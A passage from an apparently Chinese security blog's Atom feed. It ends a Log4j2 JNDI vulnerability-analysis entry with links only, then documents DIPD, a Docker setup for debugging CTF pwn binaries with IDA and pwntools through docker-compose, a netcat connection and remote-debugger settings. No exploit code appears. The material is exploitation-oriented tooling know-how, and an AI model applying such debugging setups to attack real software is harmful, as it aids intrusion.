安全客，安全资讯平台 (anquanke.com)</a></li><li><a href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></li><li><a href="https://xz.aliyun.com/t/10649#toc-2">Apache Log4j2从RCE到RC1绕过 - 先知社区 (aliyun.com)</a></li><li><a href="https://www.anquanke.com/post/id/201181">JNDI with LDAP - 安全客，安全资讯平台 (anquanke.com)</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html">Serializable Objects (oracle.com)</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html">Referenceable Objects and References (oracle.com)</a></li><li><a href="https://www.icode9.com/content-4-1253127.html">跟风蹭热度编译个logging-log4j2包-jdk11 (icode9.com)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;使用Java 8u181&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="https://cn.4xpl0r3r.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java Web" scheme="https://cn.4xpl0r3r.com/tags/Java-Web/"/>
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
    <category term="CVE" scheme="https://cn.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="格式化字符串" scheme="https://cn.4xpl0r3r.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>DIPD 文档</title>
    <link href="https://cn.4xpl0r3r.com/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/"/>
    <id>https://cn.4xpl0r3r.com/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/</id>
    <published>2021-08-25T21:18:54.000Z</published>
    <updated>2022-02-11T11:41:06.963Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/4xpl0r3r/DIPD">4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com)</a></p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的翻译：<a href="https://4xpl0r3r.com/Docs/DIPD-Document/">English</a>.</div></article><h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>通过这个工具，可以同时使用pwntools和IDA在docker中调试程序</p><p>安全 快速 强大(IDA)</p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/4xpl0r3r/DIPD.git</span><br></pre></td></tr></table></figure><ol><li>安装Docker、docker-compose和IDA(你可以将他们安装在不同的主机上，只需要保证网络畅通即可)</li><li>将程序文件移动到<code>debug/</code> 目录并改名为<code>todebug</code></li><li>在此项目根目录运行<code>docker-compose up</code>命令</li></ol><p>完成上述步骤后，通过如下命令访问程序的标准输入输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc docker.ip 23458</span><br></pre></td></tr></table></figure><p>IDA Pro调试器参数 (版本7.6)</p><ul><li>Type: Remote Linux Debugger (Attach)</li><li>Hostname: docker.ip (运行docker主机的IP)</li><li>Port: 23946</li><li>不需要密码</li></ul><p>注意</p><ul><li>在使用IDA Attach到调试进程之前，必须先使用netcat或pwntools运行程序，否则无法在IDA中看到想要的进程</li><li>你必须在64位架构中运行的Docker以同时支持32位(i386)和64位(amd64)架构程序的调试</li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>启动DIPD</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061414997.png" alt="image-20210826061414997"></p><p>运行并连接到你所调试程序的STDIO</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc docker.ip 23458</span><br></pre></td></tr></table></figure><p>现在，你的二进制文件应该已经在运行了</p><p>接下来打开IDA并启动IDA调试器</p><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061500161.png" alt="image-20210826061500161"></p><p>输入信息并点击OK</p><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061510709.png" alt="image-20210826061510709"></p><p>现在你可以看到你的docker中的进程，选择<code>./todebug</code>调试并点击”OK”</p><p><img src="../../img/DIPD-%E6%96%87%E6%A1%A3/image-20210826061558556.png" alt="image-20210826061558556"></p><p>现在你应该已经进入调试视图，没有任何错误和异常</p><h2 id="文件-docker-compose-yml"><a href="#文件-docker-compose-yml" class="headerlink" title="文件 - docker-compose.yml"></a>文件 - docker-compose.yml</h2><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>你可以在这里选择你想要的基本映像，这里有一些常用的选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i386/ubuntu:16.04</span><br><span class="line">i386/ubuntu:18.04</span><br><span class="line">amd64/ubuntu:16.04</span><br><span class="line">amd64/ubuntu:18.04</span><br></pre></td></tr></table></figure><p>你必须在64位架构中运行的Docker以同时支持32位(i386)和64位(amd64)架构程序的调试，否则只能调试32位(i386)程序</p><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p>查看相关注释即可</p><h2 id="目录-files"><a href="#目录-files" class="headerlink" title="目录 - files"></a>目录 - files</h2><h3 id="目录-debs"><a href="#目录-debs" class="headerlink" title="目录 - debs"></a>目录 - <code>debs</code></h3><p>socat的apt包，用于快速安装和离线支持</p><h3 id="文件-linux-server-64"><a href="#文件-linux-server-64" class="headerlink" title="文件 - linux_server[64]"></a>文件 - <code>linux_server[64]</code></h3><p>IDA Debug Server v7.6</p><p>如果不想使用 IDA v7.6 版本，可以进行替换</p><h3 id="文件-init-sh"><a href="#文件-init-sh" class="headerlink" title="文件 - init.sh"></a>文件 - <code>init.sh</code></h3><p>此脚本文件用于初始化调试环境，你可以对其修改以进行任何调整</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/4xpl0r3r/DIPD&quot;&gt;4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="文档" scheme="https://cn.4xpl0r3r.com/categories/%E6%96%87%E6%A1%A3/"/>
    
    
    <category term="PWN" scheme="https://cn.4xpl0r3r.com/tags/PWN/"/>
    
    <category term="CTF" scheme="https://cn.4xpl0r3r.com/tags/CTF/"/>
    
    <category term="环境" scheme="https://cn.4xpl0r3r.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
  </entry>
  
</feed>
